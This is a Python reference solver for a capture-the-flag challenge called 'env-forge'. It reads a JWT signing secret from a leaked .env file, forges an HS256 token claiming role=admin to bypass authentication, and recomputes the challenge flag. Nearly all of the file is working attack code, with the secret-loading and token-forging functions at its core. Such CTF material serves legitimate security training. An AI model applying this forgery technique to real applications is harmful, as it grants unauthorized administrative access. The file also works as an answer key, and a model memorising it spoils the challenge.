#!/usr/bin/env python3
"""Reference solver for 'env-forge'.

The leaked ``.env`` carries ``APP_JWT_SECRET``. The shipped ``app/session.py``
shows that:

  * sessions are HS256 JWTs signed with that secret, and
  * the admin flag is ``HMAC_SHA256(secret, b"nctf:admin-flag:v1")[:12]`` in
    hex, wrapped as ``NCTF{hs256_secret_leak_forged_<body>}``.

So we read the secret, forge an ``role=admin`` JWT (to prove the auth bypass),
and recompute the flag body offline. Pure standard library.
"""

import base64
import hashlib
import hmac
import json
import os


def load_secret(env_path: str) -> bytes:
    with open(env_path, encoding="utf-8") as fh:
        for line in fh:
            line = line.strip()
            if line.startswith("APP_JWT_SECRET="):
                return line.split("=", 1)[1].encode()
    raise SystemExit("APP_JWT_SECRET not found in .env")


def b64u(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def forge_admin_jwt(secret: bytes) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    claims = {"iss": "kekeli-internal", "role": "admin", "sub": "attacker"}
    seg = b64u(json.dumps(header, separators=(",", ":")).encode())
    seg += "." + b64u(json.dumps(claims, separators=(",", ":")).encode())
    mac = hmac.new(secret, seg.encode(), hashlib.sha256).digest()
    return seg + "." + b64u(mac)


def solve(root: str) -> str:
    secret = load_secret(os.path.join(root, ".env"))
    token = forge_admin_jwt(secret)
    print("[+] forged admin JWT:", token)
    body = hmac.new(secret, b"nctf:admin-flag:v1", hashlib.sha256).hexdigest()[:12]
    flag = "NCTF{hs256_secret_leak_forged_" + body + "}"
    print("[+] FLAG =", flag)
    return flag


if __name__ == "__main__":
    here = os.path.dirname(os.path.abspath(__file__))
    solve(os.path.normpath(os.path.join(here, "..")))
